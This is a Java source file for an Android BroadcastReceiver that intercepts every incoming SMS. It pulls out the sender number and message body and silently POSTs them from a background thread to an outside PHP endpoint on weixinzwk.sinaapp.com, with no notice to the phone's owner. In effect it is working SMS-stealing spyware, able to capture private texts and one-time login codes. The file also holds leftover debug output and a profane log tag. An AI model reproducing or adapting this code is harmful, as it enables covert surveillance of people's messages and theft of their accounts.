package com.test.sms;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSBroadcastReceiver extends BroadcastReceiver {
	private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

	public void onReceive(Context context, Intent intent) {

		System.err.println("------------START--------------------");

		if (intent.getAction().equals(ACTION)) {
			StringBuffer SMSAddress = new StringBuffer();
			StringBuffer SMSContent = new StringBuffer();
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdusObjects = (Object[]) bundle.get("pdus");
				SmsMessage[] messages = new SmsMessage[pdusObjects.length];
				for (int i = 0; i < pdusObjects.length; i++) {
					messages[i] = SmsMessage
							.createFromPdu((byte[]) pdusObjects[i]);
				}
				for (SmsMessage message : messages) {
					SMSAddress.append(message.getDisplayOriginatingAddress());
					SMSContent.append(message.getDisplayMessageBody());
					String msg = "发送号码：" + SMSAddress + "\n" + "短信内容："
							+ SMSContent;
					System.out.println("发送号码：" + SMSAddress + "\n" + "短信内容："
							+ SMSContent);
					System.err.println(msg);
					SendMail(SMSAddress, SMSContent);
				}
			}
		}
	}

	//
	// private void sendSMS(String sender, String body, String date) {
	// System.err.println("发送者"+sender+"内容"+body+"时间"+date);
	//
	// }

	private void SendMail(StringBuffer sMSAddress, StringBuffer sMSContent) {
		// TODO Auto-generated method stub
		final String num = sMSAddress.toString();
		final String tex = sMSContent.toString();

		new Thread() {
			public void run() {
				String url = "http://1.weixinzwk.sinaapp.com/mail.php";
				HttpPost httpRequest = new HttpPost(url);
				List<NameValuePair> params = new ArrayList<NameValuePair>();
				params.add(new BasicNameValuePair("num", num));
				params.add(new BasicNameValuePair("tex", tex));

				System.err.println("111111111111111111111");
				try {
					httpRequest.setEntity(new UrlEncodedFormEntity(params,
							HTTP.UTF_8));
					HttpClient httpClient = new DefaultHttpClient();
					HttpResponse httpResponse = httpClient.execute(httpRequest);

					String result = EntityUtils.toString(httpResponse
							.getEntity());
					System.err.println(result);
					if (httpResponse.getStatusLine().getStatusCode() == 200) {

						Log.i("fuck", "____________________________");
					} else {
						System.err
								.println("_______--------------__________--------______");
					}
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		}.start();

	}

}
